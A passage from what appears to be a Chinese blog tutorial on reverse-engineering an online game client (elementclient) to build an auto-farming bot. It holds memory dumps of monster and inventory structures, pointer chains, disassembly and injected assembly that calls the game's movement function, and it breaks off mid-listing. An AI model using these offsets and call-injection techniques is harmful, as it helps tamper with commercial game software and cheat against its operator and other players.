class=\"line\">0A3F6DFC     00000301  .... </span><br><span class=\"line\">0A3F6E00     00000301  .... </span><br><span class=\"line\">0A3F6E04     00000000  .... </span><br><span class=\"line\">0A3F6E08     00000000  .... </span><br><span class=\"line\">0A3F6E0C     0464E750  Pçd. </span><br><span class=\"line\">0A3F6E10     0464E824  $èd. </span><br><span class=\"line\">ecx + 8 = 58A9B678</span><br><span class=\"line\">58A9C27C - 58A9B678 = C04 </span><br><span class=\"line\"></span><br><span class=\"line\">ecx = esi + 14 = ecx + 14 = [eax+2*4+1C]+14 = [[[esi+4]+1C]+2*4+1C]+14 = [[[ecx+4]+1C]+2*4+1C]+14</span><br><span class=\"line\">= [[[[edi+98]+4]+1C]+2*4+1C]+14 = [[[[[1508514]+98]+4]+1C]+2*4+1C]+14</span><br><span class=\"line\"></span><br><span class=\"line\">$ ==&gt;    4F46B068     00000000 .... </span><br><span class=\"line\">$+4      4F46B06C     37327F00 ..27    ;怪物详细信息</span><br><span class=\"line\">$+8      4F46B070     80001C4A J...    ;怪物ID</span><br><span class=\"line\">$+C      4F46B074     00000000 .... </span><br><span class=\"line\">$+10     4F46B078     00000100 .... </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$ ==&gt;    37327F00  01280C5C \\.(. </span><br><span class=\"line\">$+4      37327F04  00000012 .... </span><br><span class=\"line\">$+8      37327F08  01515140 @QQ. </span><br><span class=\"line\">$+C      37327F0C  BF514D40 @MQ¿ </span><br><span class=\"line\">$+10     37327F10  00000000 .... </span><br><span class=\"line\">$+14     37327F14  3F136828 (h.? </span><br><span class=\"line\">$+18     37327F18  00000000 .... </span><br><span class=\"line\">$+1C     37327F1C  00000000 .... </span><br><span class=\"line\">$+20     37327F20  3F800000 ...? </span><br><span class=\"line\">$+24     37327F24  00000000 .... </span><br><span class=\"line\">$+28     37327F28  00000000 .... </span><br><span class=\"line\">$+2C     37327F2C  BF136828 (h.¿ </span><br><span class=\"line\">$+30     37327F30  00000000 .... </span><br><span class=\"line\">$+34     37327F34  BF514D40 @MQ¿ </span><br><span class=\"line\">$+38     37327F38  00000000 .... </span><br><span class=\"line\">$+3C     37327F3C  4430814B K.0D    ;x</span><br><span class=\"line\">$+40     37327F40  427230F2 ò0rB    ;z</span><br><span class=\"line\">$+44     37327F44  C2D852B3 ³RØÂ    ;y</span><br><span class=\"line\">$+48     37327F48  3F800000 ...? </span><br><span class=\"line\">$+4C     37327F4C  BF514D40 @MQ¿ </span><br><span class=\"line\">$+50     37327F50  00000000 .... </span><br><span class=\"line\">$+54     37327F54  3F136828 (h.? </span><br><span class=\"line\">$+58     37327F58  00000000 .... </span><br><span class=\"line\">$+5C     37327F5C  00000000 .... </span><br><span class=\"line\">$+60     37327F60  3F800000 ...? </span><br><span class=\"line\">$+64     37327F64  00000000 .... </span><br><span class=\"line\">$+68     37327F68  00000000 .... </span><br><span class=\"line\">$+6C     37327F6C  BF136828 (h.¿ </span><br><span class=\"line\">$+70     37327F70  00000000 .... </span><br><span class=\"line\">$+74     37327F74  BF514D40 @MQ¿ </span><br><span class=\"line\">$+78     37327F78  00000000 .... </span><br><span class=\"line\">$+7C     37327F7C  4430814B K.0D  ;x</span><br><span class=\"line\">$+80     37327F80  427230F2 ò0rB </span><br><span class=\"line\">$+84     37327F84  C2D852B3 ³RØÂ </span><br><span class=\"line\">$+88     37327F88  3F800000 ...? </span><br><span class=\"line\">$+8C     37327F8C  00000000 .... </span><br><span class=\"line\">$+90     37327F90  00000000 .... </span><br><span class=\"line\">$+94     37327F94  012BA6C8 È¦+. </span><br><span class=\"line\">$+98     37327F98  01246824 $h$. </span><br><span class=\"line\">$+AC     37327FAC  0000000A .... </span><br><span class=\"line\">$+B0     37327FB0  00000000 .... </span><br><span class=\"line\">$+B4     37327FB4  00000006 ....   怪物类型 6 怪物 7 NPC 9 宠物 A GM</span><br><span class=\"line\">$+B8     37327FB8  4208CC54 TÌ.B </span><br><span class=\"line\">$+BC     37327FBC  FFFF0100 ..ÿÿ </span><br><span class=\"line\">$+C0     37327FC0  00000000 .... </span><br><span class=\"line\">$+C4     37327FC4  3F735658 XVs? </span><br><span class=\"line\">$+C8     37327FC8  00000000 .... </span><br><span class=\"line\">$+CC     37327FCC  BE9F08C1 Á..¾ </span><br><span class=\"line\">$+D0     37327FD0  00000000 .... </span><br><span class=\"line\">$+D4     37327FD4  3F740BDE Þ.t? </span><br><span class=\"line\">$+D8     37327FD8  00000000 .... </span><br><span class=\"line\">$+DC     37327FDC  BE9AA083 . .¾ </span><br><span class=\"line\">$+E0     37327FE0  00000096 .... </span><br><span class=\"line\">$+E4     37327FE4  00000096 .... </span><br><span class=\"line\">$+E8     37327FE8  000001B6 ¶... </span><br><span class=\"line\">$+EC     37327FEC  FF000101 ...ÿ </span><br><span class=\"line\">$+F0     37327FF0  A0A1F1A4 ¤ñ¡  </span><br><span class=\"line\">$+F4     37327FF4  3F800000 ...? </span><br><span class=\"line\">$+F8     37327FF8  A1D9690E .iÙ¡ </span><br><span class=\"line\">$+FC     37327FFC  80000000 .... </span><br><span class=\"line\">$+100    37328000  3F800000 ...? </span><br><span class=\"line\">$+104    37328004  00000000 .... </span><br><span class=\"line\">$+108    37328008  FFFFFF00 .ÿÿÿ </span><br><span class=\"line\">$+10C    3732800C  01515158 XQQ. </span><br><span class=\"line\">$+110    37328010  4DC50270 p.ÅM &amp;&quot;`剂&quot;</span><br><span class=\"line\">$+114    37328014  0A3F6DD8 Øm?. </span><br><span class=\"line\">$+118    37328018  80001C4A J... </span><br><span class=\"line\">$+11C    3732801C  0000AE41 A®.. </span><br><span class=\"line\">$+120    37328020  0000AE41 A®.. </span><br><span class=\"line\">$+124    37328024  00000010 ....     ;怪物等级</span><br><span class=\"line\">$+128    37328028  00000000 .... </span><br><span class=\"line\">$+12C    3732802C  000003BE ¾...     ;当前血量</span><br><span class=\"line\">$+184    37328084  000003BE ¾...     ;最大血量</span><br><span class=\"line\">$+250    37328028  00000000 ....     ;1.移动加速  3.防御强化  4.法术抵抗  5.攻击强化  6.法术强化  7.舍命突击   8.生命强化  9.虚弱</span><br><span class=\"line\">$+270    373281 00001388 ....         </span><br><span class=\"line\">$+284    373281 3E312F14 ./1&gt;      L&quot;囚徒怨魂&quot;</span><br><span class=\"line\">$+288    373281 00000000 ....      </span><br><span class=\"line\"></span><br><span class=\"line\">$+2E8    373281 00000000 ....       怪物攻击目标ID</span><br><span class=\"line\">$+2EC    373281 00000000 ....       怪物攻击目标ID</span><br><span class=\"line\">$+320 26674050   ;怪物状态列表基地址</span><br><span class=\"line\">$+324 0000       ;怪物状态个数</span><br></pre></td></tr></table></figure>\n<h4 id=\"挂机功能\"><a class=\"markdownIt-Anchor\" href=\"#挂机功能\">#</a> 挂机功能</h4>\n<p>1. 挂机需要创建一个线程</p>\n<p>2. 线程中循环执行</p>\n<p>while()</p>\n<p>{</p>\n<p>​\t选中怪物</p>\n<p>​\t靠近怪物 (向怪物移动至最远攻击距离内)</p>\n<p>​\t释放技能</p>\n<p>​\t判断怪物生命值</p>\n<p>​\t判断自己生命值</p>\n<p>​\t…</p>\n<p>}</p>\n<h4 id=\"找人物移动call\"><a class=\"markdownIt-Anchor\" href=\"#找人物移动call\">#</a> 找人物移动 call</h4>\n<p>思路一：人物移动与目标地点的坐标和人物当前地点坐标数据有联系，所以我们可以从这两个数据入手开始查找</p>\n<p>思路二：网友一般将人物移动时的数据的逻辑处理放在服务端，游戏客户端与服务端通过网络通讯</p>\n<p>所以通过 send 发包函数来定位人物移动的 call 的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00B503F7 - F3 0F5C 4F 3C  - subss xmm1,[edi+3C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B50421             | 8B8F F4270000         | mov ecx,dword ptr ds:[edi+27F4]                   |</span><br><span class=\"line\">00B50427             | 6A 01                 | push 1                                            |</span><br><span class=\"line\">00B50429             | E8 42F50000           | call elementclient.B5F970                         |</span><br><span class=\"line\"></span><br><span class=\"line\">00B5042E             | 8BF0                  | mov esi,eax                                       |</span><br><span class=\"line\">00B50430             | 8D45 D4               | lea eax,dword ptr ss:[ebp-2C]                     |</span><br><span class=\"line\">00B50433             | 50                    | push eax                                          |</span><br><span class=\"line\">00B50434             | 6A 00                 | push 0                                            |</span><br><span class=\"line\">00B50436             | 8BCE                  | mov ecx,esi                                       |</span><br><span class=\"line\">00B50438             | E8 735C0100           | call elementclient.B660B0                         |</span><br><span class=\"line\"></span><br><span class=\"line\">00B5043D             | 8D85 70FFFFFF         | lea eax,dword ptr ss:[ebp-90]                     |</span><br><span class=\"line\">00B50443             | 8BCE                  | mov ecx,esi                                       |</span><br><span class=\"line\">00B50445             | 50                    | push eax                                          |</span><br><span class=\"line\">00B50446             | 8D85 64FFFFFF         | lea eax,dword ptr ss:[ebp-9C]                     |</span><br><span class=\"line\">00B5044C             | 50                    | push eax                                          |</span><br><span class=\"line\">00B5044D             | E8 2E5A0100           | call elementclient.B65E80                         |</span><br><span class=\"line\"></span><br><span class=\"line\">00B5051A             | 8B8F F4270000         | mov ecx,dword ptr ds:[edi+27F4]                   |</span><br><span class=\"line\">00B50520             | 6A 00                 | push 0                                            |</span><br><span class=\"line\">00B50522             | 56                    | push esi                                          |</span><br><span class=\"line\">00B50523             | 6A 01                 | push 1                                            |</span><br><span class=\"line\">00B50525             | E8 36020100           | call elementclient.B60760                         |</span><br><span class=\"line\"></span><br><span class=\"line\">$-2C     0019EEA0  44DB58AF    </span><br><span class=\"line\">$-28     0019EEA4  43565AF2    </span><br><span class=\"line\">$-24     0019EEA8  45889118    </span><br><span class=\"line\"></span><br><span class=\"line\">$-90     0019EE3C  3D5ECC82    </span><br><span class=\"line\">$-8C     0019EE40  3F22F622    </span><br><span class=\"line\">$-88     0019EE44  BF44F0D6    </span><br><span class=\"line\"></span><br><span class=\"line\">$-9C     0019EE30  44DB97A2    </span><br><span class=\"line\">$-98     0019EE34  435B1654    </span><br><span class=\"line\">$-94     0019EE38  4588AF10    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sub esp,0x18</span><br><span class=\"line\">mov ecx,0150B6FC</span><br><span class=\"line\">mov ecx,[ecx]</span><br><span class=\"line\">mov ecx,[ecx+30]</span><br><span class=\"line\">mov ecx,[ecx+27F4]</span><br><span class=\"line\">push 1</span><br><span class=\"line\">call 0x0B5F970</span><br><span class=\"line\"></span><br><span class=\"line\">mov esi,eax</span><br><span class=\"line\">mov ebx,44DB58AF</span><br><span class=\"line\">mov [esp+0x0],ebx</span><br><span class=\"line\">mov ebx,43565AF2</span><br><span class=\"line\">mov [esp+0x4],ebx</span><br><span class=\"line\">mov ebx,45889118</span><br><span class=\"line\">mov [esp+0x8],ebx</span><br><span class=\"line\">lea eax,[esp]</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push 0</span><br><span class=\"line\">mov ecx,esi</span><br><span class=\"line\">call 0x0B660B0   </span><br><span class=\"line\"></span><br><span class=\"line\">mov edx,3D5ECC82</span><br><span class=\"line\">mov [esp+0xC],edx</span><br><span class=\"line\">mov edx,3F22F622</span><br><span class=\"line\">mov [esp+0x10],edx</span><br><span class=\"line\">mov edx,0x0BF44F0D6</span><br><span class=\"line\">mov [esp+0x14],edx</span><br><span class=\"line\">mov ecx,esi</span><br><span class=\"line\">lea eax,[esp+0xC]</span><br><span class=\"line\">push eax</span><br><span class=\"line\">lea eax,[esp]</span><br><span class=\"line\">push eax</span><br><span class=\"line\">call 0x0B65E80 </span><br><span class=\"line\"></span><br><span class=\"line\">mov ecx,0150B6FC</span><br><span class=\"line\">mov ecx,[ecx]</span><br><span class=\"line\">mov ecx,[ecx+30]</span><br><span class=\"line\">mov ecx,[ecx+27F4]</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push esi</span><br><span class=\"line\">push 1</span><br><span class=\"line\">call 0x0B60760   </span><br><span class=\"line\"></span><br><span class=\"line\">add esp,0x18</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00B661C4 - F3 0F5C 50 3C  - subss xmm2,[eax+3C]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"找人物背包物品列表\"><a class=\"markdownIt-Anchor\" href=\"#找人物背包物品列表\">#</a> 找人物背包物品列表</h4>\n<p>思路一：以背包中某一种物品来分析，最好是能叠加的，数量可以改变</p>\n<p>物品列表 -&gt; 多种物品 (名字，数量)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00BA02D6 - 01 41 14  - add [ecx+14],eax</span><br><span class=\"line\"></span><br><span class=\"line\">00BA02D0             | 55                    | push ebp                              |</span><br><span class=\"line\">00BA02D1             | 8BEC                  | mov ebp,esp                           |</span><br><span class=\"line\">00BA02D3             | 8B45 08               | mov eax,dword ptr ss:[ebp+8]          | FFFFFFFF</span><br><span class=\"line\">00BA02D6             | 0141 14               | add dword ptr ds:[ecx+14],eax         | ecx = 72221188</span><br><span class=\"line\">00BA02D9             | 8379 14 00            | cmp dword ptr ds:[ecx+14],0           | ecx+14:L&quot;ш&quot;</span><br><span class=\"line\">00BA02DD             | 7D 07                 | jge elementclient.BA02E6              |</span><br><span class=\"line\">00BA02DF             | C741 14 00000000      | mov dword ptr ds:[ecx+14],0           | ecx+14:L&quot;ш&quot;</span><br><span class=\"line\">00BA02E6             | 8B41 18               | mov eax,dword ptr ds:[ecx+18]         | 0000270F</span><br><span class=\"line\">00BA02E9             | 3941 14               | cmp dword ptr ds:[ecx+14],eax         | ecx+14:L&quot;ш&quot;</span><br><span class=\"line\">00BA02EC             | 7E 03                 | jle elementclient.BA02F1              |</span><br><span class=\"line\">00BA02EE             | 8941 14               | mov dword ptr ds:[ecx+14],eax         | ecx+14:L&quot;ш&quot;</span><br><span class=\"line\">00BA02F1             | 8B41 14               | mov eax,dword ptr ds:[ecx+14]         | 445</span><br><span class=\"line\">00BA02F4             | 5D                    | pop ebp                               |</span><br><span class=\"line\">00BA02F5             | C2 0400               | ret 4                                 |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$ ==&gt;    722211 0127B5E4 äµ&#x27;. </span><br><span class=\"line\">$+4      722211 00000000 .... </span><br><span class=\"line\">$+8      722211 00000009 ....   ;物品类型 回血蓝0x09   0x08生产材料 0x1F仙药  0x0F武器 0x3装备 0x2弹药</span><br><span class=\"line\">$+C      722211 00000710 ....   ;ID    708(生命)  710(真气)</span><br><span class=\"line\">$+10     722211 00000000 .... </span><br><span class=\"line\">$+14     722211 00000447 G...   ;物品数量</span><br><span class=\"line\">$+18     722211 0000270F .&#x27;..   ;物品栏最大数量</span><br><span class=\"line\">$+1C     722211 00000000 .... </span><br><span class=\"line\">$+20     722211 00000384 .... </span><br><span class=\"line\"></span><br><span class=\"line\">$ ==&gt;    722225B8   4B684590 .EhK </span><br><span class=\"line\">$+4      722225BC   4B684518 .EhK </span><br><span class=\"line\">$+8      722225C0   72220770 p.&quot;r </span><br><span class=\"line\">$+C      722225C4   5D938E30 0..] </span><br><span class=\"line\">$+10     722225C8   4B6844A0  DhK </span><br><span class=\"line\">$+14     722225CC   4B684428 (DhK </span><br><span class=\"line\">$+18     722225D0   4B6843B0 °ChK </span><br><span class=\"line\">$+1C     722225D4   722207F8 ø.&quot;r </span><br><span class=\"line\">$+20     722225D8   4B684338 8ChK </span><br><span class=\"line\">$+24     722225DC   513FCC68 hÌ?Q </span><br><span class=\"line\">$+28     722225E0   70B166F8 øf±p </span><br><span class=\"line\">$+2C     722225E4   5FE23F60 `?â_ </span><br><span class=\"line\">$+30     722225E8   72221D38 8.&quot;r </span><br><span class=\"line\">$+34     722225EC   72221CB0 °.&quot;r </span><br><span class=\"line\">$+38     722225F0   72221188 ..&quot;r </span><br><span class=\"line\">$+3C     722225F4   4B683D20  =hK </span><br><span class=\"line\">$+40     722225F8   4B683CA8 ¨&lt;hK </span><br><span class=\"line\">$+44     722225FC   4B683C30 0&lt;hK </span><br><span class=\"line\">$+48     72222600   099B88E0 à... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+4C     72222604   099B8A28 (... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+50     72222608   099B8B70 p... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+54     7222260C   099B96F8 ø... &amp;&quot;P痈&quot;</span><br><span class=\"line\">$+58     72222610   099B8CB8 ¸... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+5C     72222614   4B683BB8 ¸;hK </span><br><span class=\"line\">$+60     72222618   099B8E00 .... </span><br><span class=\"line\">$+64     7222261C   099B8F48 H... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+68     72222620   099B9090 .... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+6C     72222624   099B91D8 Ø... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+70     72222628   099B9320  ... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+74     7222262C   099B9468 h... &amp;&quot;P痈&quot;</span><br><span class=\"line\">$+78     72222630   099B95B0 °... &amp;&quot;P痈&quot;</span><br><span class=\"line\">$+7C     72222634   00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\">00B77B73 - 8B 47 0C  - mov eax,[edi+0C]</span><br><span class=\"line\">00B77B73             | 8B47 0C               | mov eax,dword ptr ds:[edi+C]          | 722225B8</span><br><span class=\"line\">00B77B76             | 53                    | push ebx                              | 72221188</span><br><span class=\"line\">00B77B77             | 8B1CB0                | mov ebx,dword ptr ds:[eax+esi*4]      |</span><br><span class=\"line\">00B77B7A             | 85DB                  | test ebx,ebx                          |</span><br><span class=\"line\">00B77B7C             | 74 1D                 | je elementclient.B77B9B               |</span><br><span class=\"line\">00B77B7E             | 8B45 0C               | mov eax,dword ptr ss:[ebp+C]          | 1</span><br><span class=\"line\">00B77B81             | 8BCB                  | mov ecx,ebx                           | 72221188</span><br><span class=\"line\">00B77B83             | F7D8                  | neg eax                               |</span><br><span class=\"line\">00B77B85             | 50                    | push eax                              | -1</span><br><span class=\"line\">00B77B86             | E8 45870200           | call elementclient.BA02D0             | eax = 0x441 edi = 30AD5BF8</span><br><span class=\"line\">[edi+c]</span><br><span class=\"line\"></span><br><span class=\"line\">00B34C88             | 51                    | push ecx                              |</span><br><span class=\"line\">00B34C89             | 8BC8                  | mov ecx,eax                           | eax = 30AD5BF8  30AD5BF8</span><br><span class=\"line\"></span><br><span class=\"line\">00B34CC2             | 8B4D 08               | mov ecx,dword ptr ss:[ebp+8]          |</span><br><span class=\"line\">00B34CCA             | 50                    | push eax                              | </span><br><span class=\"line\">00B34CCB             | E8 902E0400           | call elementclient.B77B60             |</span><br><span class=\"line\"></span><br><span class=\"line\">00B49A78             | FF2485 009BB400       | jmp dword ptr ds:[eax*4+B49B00]       |</span><br><span class=\"line\">00B49A7F             | 8B81 40180000         | mov eax,dword ptr ds:[ecx+1840]       | ecx = 3E1DA010</span><br><span class=\"line\">00B49A85             | 5D                    | pop ebp                               |</span><br><span class=\"line\">00B49A86             | C2 0400               | ret 4                                 |</span><br><span class=\"line\"></span><br><span class=\"line\">[[[[[[0150B6FC]+30] + 1840]+C]+x*4] +0x14]    x [0-31]       //物品数量</span><br><span class=\"line\">[[[[0150B6FC]+30] + 1840]+10]</span><br><span class=\"line\">$ ==&gt;    30AD5BF8   0127AB74 t«&#x27;. </span><br><span class=\"line\">$+4      30AD5BFC   0127AB6C l«&#x27;. </span><br><span class=\"line\">$+8      30AD5C00   011EF3B8 ¸ó..   </span><br><span class=\"line\">$+C      30AD5C04   722225B8 ¸%&quot;r  ;背包物品列表</span><br><span class=\"line\">$+10     30AD5C08   00000020  ...  ;背包大小</span><br><span class=\"line\">$+14     30AD5C0C   00000020  ... </span><br><span class=\"line\">$+18     30AD5C10   0000000A .... </span><br><span class=\"line\">$+1C     30AD5C14   00000000 .... </span><br><span class=\"line\">$+20     30AD5C18   00010100 .... </span><br><span class=\"line\">$+40     4B6845D0  3F800000 ...? </span><br><span class=\"line\">$+44     4B6845D4  00000000 .... </span><br><span class=\"line\">$+48     4B6845D8  00000000 .... </span><br><span class=\"line\">$+4C     4B6845DC  537177BC ¼wqS L&quot;^aa32ff星云散聚石 (12)\\\\r^ffffff价格^ffffff 1 银币^ffffff (12) \\\\r^00ffff\\\\r死亡保护\\\\r不可丢在地上\\\\r不可交易\\\\r不可放入账号仓库\\\\r^FF0000占星^ffcb4a必备之物，占星时星盘属性数目、\\\\r属性内容、属性位置同时随机变化。\\\\r\\\\r^96f5ff占星时提供星运经验：1&quot;</span><br><span class=\"line\">$+50     4B6845E0  00000000 .... </span><br><span class=\"line\">$+54     4B6845E4  00000000 .... </span><br><span class=\"line\">$+58     4B6845E8  00000000 .... </span><br><span class=\"line\">$+5C     4B6845EC  00000000 .... </span><br><span class=\"line\">$+60     4B6845F0  00000000 .... </span><br><span class=\"line\">$+64     4B6845F4  00000000 .... </span><br><span class=\"line\">$+68     4B6845F8  28B10B10 ..±(  ;物品属性地址</span><br><span class=\"line\">$+6C     4B6845FC  00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\">537177BC ^aa32ff星云散聚石 (12)\\r^ffffff价格^fff</span><br><span class=\"line\"></span><br><span class=\"line\">$ ==&gt;    28B10B10 0000B985 .¹.. </span><br><span class=\"line\">$+4      28B10B14 4E91661F .f.N </span><br><span class=\"line\">$+8      28B10B18 805A6563 ceZ. </span><br><span class=\"line\">$+C      28B10B1C 000077F3 ów.. </span><br><span class=\"line\">$+10     28B10B20 00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">物品类型 = 0x09的偏移 [[[[[[0150B6FC]+30] + 1840]+C]+1*4] +0x68]+4</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230125203049839.png\" alt=\"image-20230125203049839\"></p>\n<p>特征码</p>\n<p>使用 *？匹配通配符</p>\n<p>根据特征码找游戏更新之后的新 call</p>\n<h4 id=\"找使用背包物品call\"><a class=\"markdownIt-Anchor\" href=\"#找使用背包物品call\">#</a> 找使用背包物品 call</h4>\n<p>自动吃红药</p>\n<p>自动吃蓝药</p>\n<p>免疫药</p>\n<p>无敌药</p>\n<p>思路 1：</p>\n<p>以某种物品的相关信息为线索 (名称，数量，ID 等)，用 CE 监视当使用物品时哪些代码对这些信息有访问，大致定位出使用物品 call 的范围</p>\n<p>思路 2：</p>\n<p>对于网游，物品相关的逻辑处理一般是放在服务端处理，所以使用物品的时候必定与服务端有网络数据通讯，所以断点通过 send 函数也可以定位物品使用代码的位置</p>\n<p>bp sned 对 socket 库中的发包函数下断电</p>\n<p>send-&gt; 系统的发送数据的函数</p>\n<p>游戏本身 -&gt; 也有自己的发包函数 sendmsg，这函数里面调用了 send</p>\n<p>SendData(char* data, int length)</p>\n<p>{</p>\n<p>​\t…;</p>\n<p>​\tsend();</p>\n<p>}</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span 